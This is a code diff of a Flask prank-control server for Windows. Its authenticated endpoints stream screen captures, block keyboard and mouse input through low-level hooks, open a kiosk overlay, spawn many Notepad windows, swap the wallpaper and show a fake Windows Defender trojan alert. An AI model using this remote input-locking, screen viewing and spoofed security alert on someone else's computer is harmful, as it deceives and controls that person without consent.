-        [exe, "--kiosk", url, "--edge-kiosk-type=fullscreen", "--user-data-dir=" + PASTA_KIOSK,
-         "--no-first-run", "--disable-session-crashed-bubble", "--autoplay-policy=no-user-gesture-required"],
+        [exe, "--kiosk", url,
+         "--edge-kiosk-type=fullscreen",
+         "--user-data-dir=" + PASTA_KIOSK,
+         "--no-first-run",
+         "--no-default-browser-check",
+         "--disable-session-crashed-bubble",
+         "--disable-infobars",
+         "--disable-features=TranslateUI",
+         "--noerrdialogs",
+         "--autoplay-policy=no-user-gesture-required"],
         stdin=subprocess.DEVNULL)
-    return "Efeito aberto em tela cheia. Use 'Fechar efeito' (ou Alt+F4)."
+    # bloqueia teclas do PC enquanto kiosk estiver aberto
+    time.sleep(0.6)
+    ligar_bloqueio_kiosk()
+    if segundos:
+        def auto_fechar():
+            time.sleep(segundos); fechar_efeito()
+        KIOSK["timer"] = threading.Timer(segundos, fechar_efeito)
+        KIOSK["timer"].daemon = True
+        KIOSK["timer"].start()
+    return "Efeito aberto em tela cheia. Feche pelo painel (Fechar efeito / PARAR TUDO)."
 
 
 @app.route("/api/efeito_pc", methods=["POST"])
@@ -1422,8 +1414,7 @@ def api_fechar_efeito():
     return jsonify(saida="Efeito fechado.")
 
 
-# ---------- efeitos via API do Windows ----------
-
+# ---------- teclas ----------
 def key_down(vk): ctypes.windll.user32.keybd_event(vk,0,0,0)
 def key_up(vk):   ctypes.windll.user32.keybd_event(vk,0,2,0)
 def key_press(vk): key_down(vk); key_up(vk)
@@ -1436,18 +1427,16 @@ VK_UP=0x26; VK_DOWN=0x28; VK_LEFT=0x25; VK_RIGHT=0x27
 def api_mouse_center():
     b = exigir_auth()
     if b: return b
-    try: seg = max(2, min(int((request.get_json(force=True) or {}).get("segundos", 10)), 600))
+    try: seg = max(2, min(int((request.get_json(force=True) or {}).get("segundos",10)), 600))
     except Exception: seg = 10
-    if EFEITOS_ATIVOS["mouse_center"]:
-        return jsonify(saida="Ja esta travando o cursor.")
+    if EFEITOS_ATIVOS["mouse_center"]: return jsonify(saida="Já está travando.")
     EFEITOS_ATIVOS["mouse_center"] = True
     def w():
         u = ctypes.windll.user32
         cx = u.GetSystemMetrics(0)//2; cy = u.GetSystemMetrics(1)//2
         fim = time.time() + seg
         while EFEITOS_ATIVOS["mouse_center"] and time.time() < fim:
-            u.SetCursorPos(cx, cy)
-            time.sleep(0.01)
+            u.SetCursorPos(cx, cy); time.sleep(0.01)
         EFEITOS_ATIVOS["mouse_center"] = False
     threading.Thread(target=w, daemon=True).start()
     return jsonify(saida=f"Cursor travado no centro por {seg}s.")
@@ -1457,14 +1446,12 @@ def api_mouse_center():
 def api_mouse_invert():
     b = exigir_auth()
     if b: return b
-    try: seg = max(2, min(int((request.get_json(force=True) or {}).get("segundos", 10)), 600))
+    try: seg = max(2, min(int((request.get_json(force=True) or {}).get("segundos",10)), 600))
     except Exception: seg = 10
-    if EFEITOS_ATIVOS["mouse_invert"]:
-        return jsonify(saida="Ja esta invertido.")
+    if EFEITOS_ATIVOS["mouse_invert"]: return jsonify(saida="Já está invertido.")
     EFEITOS_ATIVOS["mouse_invert"] = True
     def w():
-        u = ctypes.windll.user32
-        pt = PONTO(); u.GetCursorPos(ctypes.byref(pt))
+        u = ctypes.windll.user32; pt = PONTO(); u.GetCursorPos(ctypes.byref(pt))
         lx, ly = pt.x, pt.y
         fim = time.time() + seg
         while EFEITOS_ATIVOS["mouse_invert"] and time.time() < fim:
@@ -1480,28 +1467,49 @@ def api_mouse_invert():
     return jsonify(saida=f"Mouse invertido por {seg}s.")
 
 
+# lista de PIDs de notepads abertos pela bomba
+NOTEPADS = []
+
+
 @app.route("/api/notepad_bomb", methods=["POST"])
 def api_notepad_bomb():
     b = exigir_auth()
     if b: return b
-    try: n = max(1, min(int((request.get_json(force=True) or {}).get("quantidade", 5)), 20))
+    try: n = max(1, min(int((request.get_json(force=True) or {}).get("quantidade",5)), 20))
     except Exception: n = 5
     def w():
         for _ in range(n):
-            try: subprocess.Popen(["notepad.exe"])
+            try:
+                p = subprocess.Popen(["notepad.exe"])
+                NOTEPADS.append(p.pid)
             except Exception: pass
-            time.sleep(0.15)
+            time.sleep(0.12)
     threading.Thread(target=w, daemon=True).start()
     return jsonify(saida=f"Abrindo {n} notepads...")
 
 
-def gerar_wallpaper_troll():
+def fechar_notepads_abertos():
+    global NOTEPADS
+    for pid in list(NOTEPADS):
+        try: executar(["taskkill","/PID",str(pid),"/F"], capture_output=True)
+        except Exception: pass
+    NOTEPADS = []
+
+
+@app.route("/api/fechar_notepads", methods=["POST"])
+def api_fechar_notepads():
+    b = exigir_auth()
+    if b: return b
+    fechar_notepads_abertos()
+    return jsonify(saida="Notepads fechados.")
+
+
+def gerar_wallpaper_troll_img():
     u = ctypes.windll.user32
     w = max(800, u.GetSystemMetrics(0)); h = max(600, u.GetSystemMetrics(1))
     img = Image.new("RGB", (w, h), (10, 10, 15))
     d = ImageDraw.Draw(img)
-    try:
-        f = ImageFont.truetype("arialbd.ttf", int(h/8))
+    try: f = ImageFont.truetype("arialbd.ttf", int(h/8))
     except Exception:
         try: f = ImageFont.load_default()
         except Exception: f = None
@@ -1510,50 +1518,64 @@ def gerar_wallpaper_troll():
         bbox = d.textbbox((0,0), txt, font=f)
         tw, th = bbox[2]-bbox[0], bbox[3]-bbox[1]
         d.text(((w-tw)/2, (h-th)/2), txt, fill=(240, 0, 240), font=f)
-        sub = "XITADASSO"
-        try: f2 = ImageFont.truetype("arialbd.ttf", int(h/20))
-        except Exception: f2 = f
-        bbox = d.textbbox((0,0), sub, font=f2)
-        d.text(((w-(bbox[2]-bbox[0]))/2, h/2 + th), sub, fill=(154,60,255), font=f2)
-    except Exception:
-        pass
+    except Exception: pass
     path = os.path.join(tempfile.gettempdir(), "xitadasso_wall.bmp")
     img.save(path, "BMP")
     return path
+
+
+def wallpaper_engine_rodando():
+    try:
+        r = executar(["tasklist","/FI","IMAGENAME eq wallpaper32.exe"],
+                     capture_output=True, text=True)
+        if "wallpaper32" in (r.stdout or "").lower(): return True
+        r = executar(["tasklist","/FI","IMAGENAME eq wallpaper64.exe"],
+                     capture_output=True, text=True)
+        if "wallpaper64" in (r.stdout or "").lower(): return True
+    except Exception: pass
+    return False
 
 
 @app.route("/api/wallpaper_troll", methods=["POST"])
 def api_wallpaper_troll():
     b = exigir_auth()
     if b: return b
-    try: seg = max(2, min(int((request.get_json(force=True) or {}).get("segundos", 10)), 600))
+    try: seg = max(2, min(int((request.get_json(force=True) or {}).get("segundos",10)), 600))
     except Exception: seg = 10
-    if EFEITOS_ATIVOS["wallpaper"]:
-        return jsonify(saida="Wallpaper ja esta trollado.")
+    if EFEITOS_ATIVOS["wallpaper"]: return jsonify(saida="Wallpaper já está trollado.")
+
+    # Se Wallpaper Engine estiver rodando, overlay em kiosk (mais confiável)
+    if wallpaper_engine_rodando():
+        EFEITOS_ATIVOS["wallpaper"] = True
+        def fechar_wall():
+            EFEITOS_ATIVOS["wallpaper"] = False
+        abrir_no_pc("/wallpaper", segundos=seg)
+        threading.Timer(seg, fechar_wall).start()
+        return jsonify(saida=f"Wallpaper Engine detectado. Overlay troll por {seg}s.")
+
+    # Senão, troca o wallpaper de verdade e restaura
     EFEITOS_ATIVOS["wallpaper"] = True
     def w():
         u = ctypes.windll.user32
-        SPI_SET=20; SPIF=0x01|0x02
+        SPI_SET = 20; SPIF = 0x01|0x02
         buf = ctypes.create_unicode_buffer(520)
         try: u.SystemParametersInfoW(0x0073, 520, buf, 0)
         except Exception: pass
         original = buf.value
         try:
-            troll = gerar_wallpaper_troll()
+            troll = gerar_wallpaper_troll_img()
             u.SystemParametersInfoW(SPI_SET, 0, troll, SPIF)
             fim = time.time() + seg
             while EFEITOS_ATIVOS["wallpaper"] and time.time() < fim:
                 time.sleep(0.5)
-        except Exception as e:
-            log_seguro("erro wallpaper:", e)
+        except Exception as e: log_seguro("erro wallpaper:", e)
         finally:
             try:
                 if original and os.path.exists(original):
                     u.SystemParametersInfoW(SPI_SET, 0, original, SPIF)
                 else:
                     u.SystemParametersInfoW(SPI_SET, 0, "", SPIF)
-            except Exception:
-                pass
+            except Exception: pass
             EFEITOS_ATIVOS["wallpaper"] = False
     threading.Thread(target=w, daemon=True).start()
     return jsonify(saida=f"Wallpaper trollado por {seg}s (depois restaura).")
@@ -1566,10 +1588,10 @@ def api_invert_colors():
     ativo = bool((request.get_json(force=True) or {}).get("ativo"))
     if ativo and not EFEITOS_ATIVOS["invert_colors"]:
         key_down(VK_LWIN); key_press(VK_ADD); key_up(VK_LWIN)
-        time.sleep(0.35)
+        time.sleep(0.4)
         key_down(VK_CTRL); key_down(VK_ALT); key_press(VK_I); key_up(VK_ALT); key_up(VK_CTRL)
         EFEITOS_ATIVOS["invert_colors"] = True
-        return jsonify(saida="Cores invertidas (magnifier). Desligue no botao.")
+        return jsonify(saida="Cores invertidas.")
     elif not ativo and EFEITOS_ATIVOS["invert_colors"]:
         key_down(VK_LWIN); key_press(VK_ESC); key_up(VK_LWIN)
         EFEITOS_ATIVOS["invert_colors"] = False
@@ -1583,10 +1605,10 @@ def api_rotate_screen():
     if b: return b
     d = (request.get_json(force=True) or {}).get("direcao", "up")
     vk = {"up":VK_UP,"down":VK_DOWN,"left":VK_LEFT,"right":VK_RIGHT}.get(d)
-    if not vk: return jsonify(erro="direcao invalida"), 400
+    if not vk: return jsonify(erro="direção inválida"), 400
     key_down(VK_CTRL); key_down(VK_ALT); key_press(vk); key_up(VK_ALT); key_up(VK_CTRL)
     EFEITOS_ATIVOS["rotate"] = None if d=="up" else d
-    return jsonify(saida=f"Girar: {d}. Se nao funcionou, seu driver nao suporta.")
+    return jsonify(saida=f"Girar: {d}. Só funciona em alguns drivers.")
 
 
 @app.route("/api/popup_antivirus", methods=["POST"])
@@ -1599,37 +1621,35 @@ def api_popup_antivirus():
                 try: winsound.PlaySound("SystemHand", winsound.SND_ALIAS | winsound.SND_ASYNC)
                 except Exception: pass
             ctypes.windll.user32.MessageBoxW(
-                0, "AMEACA DETECTADA!\n\nTrojan.Win32.Xitadasso foi encontrado em C:\\Windows\\System32.\n\nClique OK para continuar (brincadeira).",
-                "WINDOWS DEFENDER - ALERTA CRITICO", 0x10 | 0x40000 | 0x1000)
-        except Exception as e:
-            log_seguro("erro popup:", e)
+                0,
+                "AMEAÇA DETECTADA!\n\n"
+                "Trojan.Win32.Xitadasso foi encontrado em C:\\Windows\\System32.\n\n"
+                "Clique OK para continuar (brincadeira).",
+                "WINDOWS DEFENDER - ALERTA CRÍTICO", 0x10 | 0x40000 | 0x1000)
+        except Exception as e: log_seguro("erro popup:", e)
     threading.Thread(target=w, daemon=True).start()
-    return jsonify(saida="Popup antivirus com som critico.")
+    return jsonify(saida="Popup antivírus com som crítico.")
 
 
 @app.route("/api/parar_tudo", methods=["POST"])
 def api_parar_tudo():
     b = exigir_auth()
     if b: return b
-    # para mouse center / invert / wallpaper
     EFEITOS_ATIVOS["mouse_center"] = False
     EFEITOS_ATIVOS["mouse_invert"] = False
     EFEITOS_ATIVOS["wallpaper"] = False
-    # desliga invert colors (magnifier)
     if EFEITOS_ATIVOS["invert_colors"]:
         try:
             key_down(VK_LWIN); key_press(VK_ESC); key_up(VK_LWIN)
         except Exception: pass
         EFEITOS_ATIVOS["invert_colors"] = False
-    # rotacao volta pro normal
     if EFEITOS_ATIVOS["rotate"]:
         try:
             key_down(VK_CTRL); key_down(VK_ALT); key_press(VK_UP); key_up(VK_ALT); key_up(VK_CTRL)
         except Exception: pass
         EFEITOS_ATIVOS["rotate"] = None
-    # fecha kiosk
     fechar_efeito()
-    # destranca teclado/mouse
+    fechar_notepads_abertos()
     TRAVA["ativa"] = False
     return jsonify(saida="Tudo parado.")
 
@@ -1689,7 +1709,7 @@ def api_popup():
     if b: return b
     texto = texto_da_requisicao()
     def w():
-        ctypes.windll.user32.MessageBoxW(0, texto, "ALERTA DE SEGURANCA", 0x10 | 0x40000)
+        ctypes.windll.user32.MessageBoxW(0, texto, "ALERTA DE SEGURANÇA", 0x10 | 0x40000)
     threading.Thread(target=w, daemon=True).start()
     return jsonify(saida="Pop-up aberto: " + texto)
 
@@ -1703,24 +1723,19 @@ def api_tela():
     try: w = max(480, min(int(request.args.get("w", 1280)), 2400))
     except Exception: w = 1280
     mon = request.args.get("mon", "all")
-    TELA["config"] = (q, w, mon)
-    TELA["ultimo_pedido"] = time.time()
+    TELA["config"] = (q, w, mon); TELA["ultimo_pedido"] = time.time()
     if not TEM_MSS:
-        if ImageGrab is None:
-            return jsonify(erro="captura indisponivel"), 500
+        if ImageGrab is None: return jsonify(erro="captura indisponível"), 500
         try:
             img = ImageGrab.grab()
-            if img.width > w:
-                img = img.resize((w, round(img.height * w / img.width)))
+            if img.width > w: img = img.resize((w, round(img.height * w / img.width)))
             buf = io.BytesIO(); img.convert("RGB").save(buf, "JPEG", quality=q)
             return Response(buf.getvalue(), mimetype="image/jpeg", headers={"Cache-Control":"no-store"})
-        except Exception as e:
-            return jsonify(erro=str(e)), 500
+        except Exception as e: return jsonify(erro=str(e)), 500
     garantir_captura()
     with TELA["lock"]:
         jpeg = TELA["ultimo_jpeg"]; err = TELA["erro"]
-    if jpeg is None:
-        return jsonify(erro=err or "aguardando..."), 503
+    if jpeg is None: return jsonify(erro=err or "aguardando..."), 503
     return Response(jpeg, mimetype="image/jpeg", headers={"Cache-Control":"no-store"})
 
 
@@ -1763,8 +1778,7 @@ def loop_trava(segundos):
     u.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]
     u.CallNextHookEx.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_size_t, ctypes.c_ssize_t]
     u.CallNextHookEx.restype = ctypes.c_ssize_t
-    def blk(c, w, l):
-        return 1 if c >= 0 else u.CallNextHookEx(None, c, w, l)
+    def blk(c, w, l): return 1 if c >= 0 else u.CallNextHookEx(None, c, w, l)
     proc = HOOKPROC(blk); hk = hm = None
     try:
         mod = k.GetModuleHandleW(None)
@@ -1775,8 +1789,7 @@ def loop_trava(segundos):
             while u.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1):
                 u.TranslateMessage(ctypes.byref(msg)); u.DispatchMessageW(ctypes.byref(msg))
             time.sleep(0.005)
-    except Exception as e:
-        log_seguro("erro trava:", e)
+    except Exception as e: log_seguro("erro trava:", e)
     finally:
         if hk: u.UnhookWindowsHookEx(hk)
         if hm: u.UnhookWindowsHookEx(hm)
@@ -1787,13 +1800,13 @@ def loop_trava(segundos):
 def api_trancar():
     b = exigir_auth()
     if b: return b
-    if TRAVA["ativa"]: return jsonify(saida="Ja trancado.")
+    if TRAVA["ativa"]: return jsonify(saida="Já trancado.")
     try: seg = int((request.get_json(force=True) or {}).get("segundos", 300))
     except Exception: seg = 300
     seg = max(5, min(seg, 3600))
     TRAVA["ativa"] = True
     threading.Thread(target=loop_trava, args=(seg,), daemon=True).start()
-    return jsonify(saida=f"Trancado por ate {seg}s.")
+    return jsonify(saida=f"Trancado por até {seg}s.")
 
 
 @app.route("/api/destrancar", methods=["POST"])
